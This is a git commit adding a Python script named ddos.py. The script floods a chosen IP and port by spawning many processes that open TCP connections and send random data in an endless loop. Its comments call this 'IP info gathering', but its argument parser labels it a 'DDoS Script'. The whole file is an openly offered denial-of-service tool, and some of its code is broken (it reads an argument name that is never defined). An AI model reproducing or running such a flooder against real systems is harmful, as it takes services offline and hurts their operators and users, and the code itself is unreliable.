67c4ec635db368a837112d8aa916365d6d1b169e
Destroyer-official <156152706+Destroyer-official@users.noreply.github.com>
2024-01-10 17:22:07 +0530

    Create ddos.py

---
+++ ddos.py
@@ -0,0 +1,83 @@
+import socket
+import random
+import asyncio
+import multiprocessing
+import argparse
+
+# Function to run IP info gathering
+def run_ip_info(ip_address, port, num_processes, num_threads_per_process):
+    try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(ip_info(ip_address, port, num_processes, num_threads_per_process))
+    except Exception as e:
+        pass
+
+# Asynchronous function to gather IP info
+async def ip_info(ip_address, port, num_processes, num_threads_per_process):
+    try:
+        target = socket.gethostbyname(ip_address)
+    except socket.gaierror:
+        print("Hostname could not be resolved")
+        return
+
+    try:
+        tasks = [send_packets(target, port, num_threads_per_process) for _ in range(num_processes)]
+        await asyncio.gather(*tasks)
+    except Exception as e:
+        pass
+
+# Asynchronous function to send packets
+async def send_packets(target, port, num_threads):
+    try:
+        await asyncio.gather(
+            *[send_packet(target, port) for _ in range(num_threads)]
+        )
+    except Exception as e:
+        pass
+
+# Asynchronous function to send individual packet
+async def send_packet(target, port):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((target, port))
+        sock.setblocking(False)
+        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        bytes_data = random._urandom(65000)
+
+        while True:
+            sock.send(bytes_data)
+    except Exception as e:
+        pass
+
+if __name__ == '__main__':
+    # Command-line arguments parsing
+    parser = argparse.ArgumentParser(description='DDoS Script')
+    parser.add_argument('--ip', required=True, help='Target IP address')
+    parser.add_argument('--p', required=True, type=int, help='Target port number')
+    parser.add_argument('--processes', default=10, type=int, help='Number of processes to run in parallel')
+    parser.add_argument('--threads', default=50, type=int, help='Number of threads per process')
+    args = parser.parse_args()
+
+    try:
+        ip_address = args.ip
+        port = args.port
+        num_processes = args.processes
+        num_threads_per_process = args.threads
+        processes = []
+
+        try:
+            for _ in range(num_processes):
+                process = multiprocessing.Process(target=run_ip_info, args=(ip_address, port, num_processes, num_threads_per_process))
+                processes.append(process)
+                process.start()
+        except Exception as e:
+            pass
+
+        try:
+            for process in processes:
+                process.join()
+        except Exception as e:
+            pass
+    except Exception as e:
+        pass
